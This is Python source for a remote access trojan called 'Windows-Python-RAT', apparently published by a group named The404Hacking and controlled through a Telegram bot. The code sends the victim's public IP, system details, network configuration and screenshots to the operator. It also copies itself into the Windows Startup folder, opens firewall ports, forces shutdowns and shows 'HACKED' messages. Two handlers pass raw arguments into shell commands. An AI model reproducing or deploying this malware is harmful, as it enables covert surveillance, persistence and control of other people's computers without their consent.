#########################################################
# Windows-Python-RAT                                    #
# [R]emote [A]dministrator [T]ool                   	#
# GitHub: https://github.com/Windows-Python-RAT         #
# ##################################################### #
# Coded By Sir.4m1R (Amir Hossein Yeganeh)          	#
# Telegram:        @Sir4m1R                         	#
# Email:           Sir.4m1R@Gmail.Com               	#
# ##################################################### #
# Developed By Hanieh Panahi                            #
# Telegram:        @Hanie0101                           #
# ##################################################### #
# The404Hacking                                     	#
# Digital Security ReSearch Group                   	#
# ##################################################### #
# Telegram:        https://Telegram.me/The404Hacking    #
# Instagram:       https://instagram.com/The404Hacking  #
# Aparat:          http://aparat.com/The404Hacking  	#
# YouTube:         http://yon.ir/youtube404         	#
# GitHub:          https://github.com/The404Hacking     #
# LahzeNegar       https://lahzenegar.com/The404Hacking #
# Email:           The404Hacking.Team@Gmail.Com         #
#########################################################
from telegram.ext import Updater , CommandHandler
import telegram
import urllib
import platform
import os
import time
import datetime
import pyttsx
import autopy
# ------------------------------------------------------------------------
#Replace Your Bot API-TOKEN
update = Updater("TOKEN")
# ------------------------------------------------------------------------
# /start
def start_method(bot , update):
	ippublic = urllib.urlopen("https://ip.42.pl/raw").read()
	hello = 'Hi Dear User !\n'
	hello += 'WelCome to Your RAT Control Panel [@Bot]\n\n'
	#hello += 'Time: '+time.ctime()+'\n\n'
	hello += 'New Target Connected !\nTarget IP: '+ippublic+'\n\n'
	hello += 'Help: /help\n@The404Hacking\nDigital Security ReSearch Group'
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id,hello)

# /help
def help_method(bot , update):
	helptxt = '''
WelCome to Help:
------------------------
Bot Commands:
[01] Start & Connect to Target.
[ /] /start
[02] Help RAT.
[ /] /help
[03] System Information.
[ /] /sysinfo
[04] Take Sreenshot.
[ /] /screenshot
[05] Add RAT to StartUP.
[ /] /startup
[06] About RAT.
[ /] /about
[07] Contact RAT.
[ /] /contact
------------------------
Other Commands:
[01] Target IP Address:
[ /] /ip
[02] Get Target IPConfig.
[ /] /ipconfig
[03] Get Target MAC Address.
[ /] /getmac
[04] Shutdown Target Windows.
[ /] /shutdown
[05] ReStart Target Windows.
[ /] /restart
[06] Send HACKED Message.
[ /] /message
[07] Send HACKED Voice Message.
[ /] /voicemsg
[08] Create Folder on Target Desktop.
[ /] /folder [NAME]
[09] Swap Target Mouse Button.
[ /] /swapmouse
[10] Open Port on Target Firewall.
[ /] /port [PORT NUMBER]
[11] Change Target Time to 00:00
[ /] /time
[12] Windows-Python-RAT GitHub.
[ /] /github
[13] Windows-Python-RAT Logo.
[ /] /logo

@The404Hacking
Digital Security ReSearch Group
'''
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , helptxt)
# ------------------------------------------------------------------------
# /time
def time_method(bot , update):
	os.system("time 00:00")
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Target Time Changed to 00:00\n\nHelp: /help\n@The404Hacking\Digital Security ReSearch Group")

# /port [PORT NUMBER]
def port_method(bot , update, args):
	os.system('netsh firewall add portopening protocol = TCP port = '+args[0]+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id,"Port Has Been Opened !\n\nPort Number: "+args[0]+"\nProtocol: TCP\nName: TCP/IP\nMode: ENABLE\nScope: SUBNET\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")

# /swapmouse
def swapmouse_method(bot , update):
	os.system("rundll32 user32,SwapMouseButton")
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Swap Mouse Button Successfully !\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")

# /folder [NAME]
def folder_method(bot , update, args):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Please Wait ...")
	os.system("cd\&&C:&&cd %userprofile%\desktop\&&mkdir "+args[0])
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Folder Created with "+args[0]+" Name !\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")

# /ipconfig
def ipconfig_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Please Wait ...")
	os.system("ipconfig >> C:\\Windows\\getip.txt")
	getipfile = open("C:\\Windows\\getip.txt" , "rb")
	bot.sendDocument(chat_id,getipfile,"GetIP.txt")
	getipfile.close()

# /getmac
def getmac_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Please Wait ...")
	os.system("getmac >> C:\\Windows\\getmac.txt")
	getipfile = open("C:\\Windows\\getmac.txt" , "rb")
	bot.sendDocument(chat_id,getipfile,"GetMAC.txt")
	getipfile.close()

# /voicemsg
def voicemsg_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Voice Message Playing !")
	sound = pyttsx.init()
	sound.setProperty("rate", 110)
	sound.say("Your System Has Been HACKED by The404Hacking - Digital Security ReSearch Group")
	sound.runAndWait()
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Voice Message Played !\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")

# /shutdown
def shutdown_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id, "Shutdown Successfully !\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")
	os.system("shutdown /s /t 1")

# /message
def message_method(bot , update):
	os.system("msg * Your System Has Been HACKED by The404Hacking - Digital Security ReSearch Group")
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "HACKED Message has Send !\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")

# /restart
def restart_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "ReStart Successfully !\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")
	os.system("shutdown /r /t 1")

# /ip
def ip_method(bot , update):
	ip = urllib.urlopen("https://ip.42.pl/raw").read()
	iptxt = ''
	iptxt += 'Target IP Public: '+ip+'\n\n'
	iptxt += 'Help: /help\n@The404Hacking\nDigital Security ReSearch Group'
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id, iptxt)

# /about
def about_method(bot , update):
	about_text = "\n"
	about_text += "Hi !\n"
	about_text += "WelCome to Windows-Python-RAT About :)\n"
	about_text += "\n"
	about_text += "This RAT Created by Sir.4m1R.\n"
	about_text += "This is a RAT for Computer Hacking and Infiltration with Microsoft Windows Operating Systems.\n"
	about_text += "\n"	
	about_text += "Using this tool, you can easily perform the Penetration Test on Windows and get the commands that are registered in the management robot to get the Information you want from the Control Panel Robot (Robot management RAT)."
	about_text += "\n"
	about_text += "This RAT is controlled by a robot in the Telegram. For the robot to work and send Information and logs to you in a telegram, you just have to create a Robot in the Telegram with @BotFather robot."
	about_text += "\n"
	about_text += "\n"
	about_text += "Powered By Sir.4m1R.\n"
	about_text += "Developed By Hanieh Panahi\n"
	about_text += "Copyright (C) 2018 The404Hacking.\n\n"
	about_text += "Contact: /contact\n"
	about_text += "Help: /help\n@The404Hacking\nDigital Security ReSearch Group"
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , about_text)
	
# /contact
def contact_method(bot , update):
	contact_text = ""
	contact_text += "Hi !\n"
	contact_text += "\n"
	contact_text += "Creator: Sir.4m1R\n"
	contact_text += "Telegram: @Sir4m1R\n"
	contact_text += "Email: Sir.4m1R@Gmail.Com\n"
	contact_text += "-------------------------\n"
	contact_text += "Developer: Hanieh Panahi\n"
	contact_text += "Telegram: @haniepanahi\n"
	contact_text += "Developer Team: @The404Hacking\n"
	contact_text += "\n"
	contact_text += "The404Hacking\n"
	contact_text += "Digital Security ReSearch Group\n"
	contact_text += "\n"
	contact_text += "Telegram: https://T.me/The404Hacking\n"
	contact_text += "Instagram: https://Instagram.com/The404Hacking\n"
	contact_text += "Aparat: http://Aparat.com/The404Hacking\n"
	contact_text += "YouTube: http://yon.ir/youtube404\n"
	contact_text += "GitHub: https://github.com/The404Hacking\n"
	contact_text += "LahzeNegar: https://lahzenegar.com/The404Hacking\n"
	contact_text += "Email: The404Hacking.Team@Gmail.Com\n"
	contact_text += "---------------------------------------------\n"
	contact_text += "Admins and Support:\n"
	contact_text += "https://T.me/The404HackingAdmins\n"
	contact_text += "---------------------------------------------\n"
	contact_text += "Powered By Sir.4m1R.\n"
	contact_text += "Developed By Hanieh Panahi\n"
	contact_text += "Copyright (C) 2018 The404Hacking.\n\n"
	contact_text += "About: /about\n"
	contact_text += "Help: /help\n@The404Hacking\nDigital Security ReSearch Group"
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , contact_text)

# /sysinfo
def sysinfo_method(bot , update):
	ip_public = urllib.urlopen("http://ip.42.pl/raw").read()
        data = 'OS: '+platform.uname()[0]+' '+platform.uname()[2]+' - '+platform.architecture()[0]+'\n'
        data += 'Node: '+platform.node()+'\n'
        data += 'PC Name: '+platform.uname()[1]+'\n'
        data += 'Version: '+platform.uname()[3]+'\n'
        data += 'System Type: '+platform.uname()[4]+'\n'
        data += 'Description: '+platform.uname()[5]+'\n'
        data += 'Public IP: '+ip_public+'\n'
        data += '\n'
        data += 'Help: /help\n@The404Hacking\nDigital Security ReSearch Group'
        chat_id = update.message.chat_id
        bot.sendMessage(chat_id,data)

# /github
def github_method(bot , update):
	githubtxt = ''
	githubtxt += 'Hi !\n\n'
	githubtxt += 'Windows-Python-RAT GitHub:\n'
	githubtxt += 'https://github.com/The404Hacking/Windows-Python-RAT\n\n'
	githubtxt += 'Help: /help\n@The404Hacking\nDigital Security ReSearch Group'
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , githubtxt)
	
# /screenshot
def screenshot_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Please Wait ...")
	image = autopy.bitmap.capture_screen()
	image.save("C:\\Windows\\ScreenShot.png")
	chat_id = update.message.chat_id
	photo = open("C:\\Windows\\ScreenShot.png" , "rb")
	bot.sendPhoto(chat_id,photo,"Target ScreenShot !\n\nAgain: /screenshot\n\nHelp: /help\n@The404Hacking")
	photo.close()
	os.system("del C:\Windows\ScreenShot.png")

# /logo
def logo_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Please Wait ...")
	chat_id = update.message.chat_id
	photo = open("Windows-Python-RAT.jpg" , "rb")
	bot.sendPhoto(chat_id,photo,"Windows-Python-RAT Logo !\n\nHelp: /help\n@The404Hacking")

# /startup
def startup_method(bot , update):
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Please Wait ...")
	os.system('copy YOUR-COMPILED-RAT-NAME.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
	#replace your rat name on 'YOUR-COMPILED-RAT-NAME.exe'
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "RAT Added to Target System Startup.\n\nHelp: /help\n@The404Hacking\nDigital Security ReSearch Group")
# ------------------------------------------------------------------------
start = CommandHandler("start" , start_method) #/start
update.dispatcher.add_handler(start)

sysinfo = CommandHandler("sysinfo" , sysinfo_method) #/sysinfo
update.dispatcher.add_handler(sysinfo)

help_ = CommandHandler("help" , help_method) #/help
update.dispatcher.add_handler(help_)

screenshot = CommandHandler("screenshot" , screenshot_method) #/screenshot
update.dispatcher.add_handler(screenshot)

startup = CommandHandler("startup" , startup_method) #/startup
update.dispatcher.add_handler(startup)

ip = CommandHandler("ip" , ip_method) #/ip
update.dispatcher.add_handler(ip)

ipconfig = CommandHandler("ipconfig" , ipconfig_method) #/ipconfig
update.dispatcher.add_handler(ipconfig)

getmac = CommandHandler("getmac" , getmac_method) #/getmac
update.dispatcher.add_handler(getmac)

shutdown = CommandHandler("shutdown" , shutdown_method) #/shutdown
update.dispatcher.add_handler(shutdown)

restart = CommandHandler("restart" , restart_method) #/restart
update.dispatcher.add_handler(restart)

message = CommandHandler("message" , message_method) #/message
update.dispatcher.add_handler(message)

voicemsg = CommandHandler("voicemsg" , voicemsg_method) #/voicemsg
update.dispatcher.add_handler(voicemsg)

folder = CommandHandler("folder" , folder_method , pass_args=True) #/folder [NAME]
update.dispatcher.add_handler(folder)

port = CommandHandler("port" , port_method , pass_args=True) #/port
update.dispatcher.add_handler(port)

swapmouse = CommandHandler("swapmouse" , swapmouse_method) #/swapmouse
update.dispatcher.add_handler(swapmouse)

time = CommandHandler("time" , time_method) #/time
update.dispatcher.add_handler(time)

about = CommandHandler("about" , about_method) #/about
update.dispatcher.add_handler(about)

contact = CommandHandler("contact" , contact_method) #/contact
update.dispatcher.add_handler(contact)

github = CommandHandler("github", github_method)
update.dispatcher.add_handler(github)

logo = CommandHandler("logo" , logo_method)
update.dispatcher.add_handler(logo)

update.start_polling()
# ------------------------------------------------------------------------
